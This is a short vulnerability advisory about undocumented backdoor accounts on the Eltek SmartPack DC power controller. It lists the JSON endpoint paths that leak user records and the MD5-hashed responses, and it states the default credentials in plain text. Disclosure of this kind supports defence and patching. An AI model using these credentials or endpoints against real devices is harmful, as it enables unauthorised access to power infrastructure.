@@ -1,0 +1,86 @@
+Eltek SmartPack - Backdoor Account
+
+Author: Saeed reza Zamanian [penetrationtest @ Linkedin]
+Product: Eltek SmartPack
+Vendor: http://www.eltek.com/
+Product Link : http://www.eltek.com/detail_products.epl?k1=25507&id=1123846
+
+About Product:
+
+The Smartpack controller is a powerful and cost-effective module, developed for monitoring and controlling a wide range of Elte's DC power supply systems.
+You operate the system from the front panel, locally via a PC using the PowerSuite PC application, or remotely via modem, Ethernet and the Web. The module then utilizes the USB- or RS-232 ports to interface with a local PC, SNMP or Web adapters.
+
+Vulnerability Report:
+In Eltek Management Section, on following path, some json files (sush as cfgUseraccount1.json to cfgUseraccount10.json) will be called , that disclose some of pre-defined system users.
+the json response is containing username and password (hashed in MD5), if you crack the MD5 hashes to plain text you can be able to login in the system. (same as bellow).
+Please Note: the users were not note in users manual.
+
+control:control
+status:status
+
+Path:
+system conf>Devuce Settings>User Accounts
+-----------------------------
+json Path:
+http://10.211.7.70/RPC/Eltek/cfgUseraccount1.json
+to .....
+http://10.211.7.70/RPC/Eltek/cfgUseraccount10.json
+-----------------------------
+json responses:
+
+{
+	"jsonrpc":	"2.0",
+	"result":	[{
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgLevel:vU8int1"
+,
+			"Value":	2
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgUser:vString21"
+,
+			"Value":	"control"
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword:vString21"
+,
+			"Value":	"fc5364bf9dbfa34954526becad136d4b"
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword_new
+:vString21",
+			"Value":	null
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword_renew
+:vString21",
+			"Value":	null
+		}],
+	"id":	21
+
+	
+-------------------------------------------------------------------------------------------
+{
+	"jsonrpc":	"2.0",
+	"result":	[{
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgLevel:vU8int1"
+,
+			"Value":	1
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgUser:vString21"
+,
+			"Value":	"status"
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword:vString21"
+,
+			"Value":	"9acb44549b41563697bb490144ec6258"
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword_new
+:vString21",
+			"Value":	null
+		}, {
+			"Path":	"SystemType_ControlSystem.1.ControlUnitPart_security.0.Object_user.UserId_cfgPassword_renew
+:vString21",
+			"Value":	null
+		}],
+	"id":	8
+}
+
+-------------------------------------------------------------------------------------------
+
+#EOF
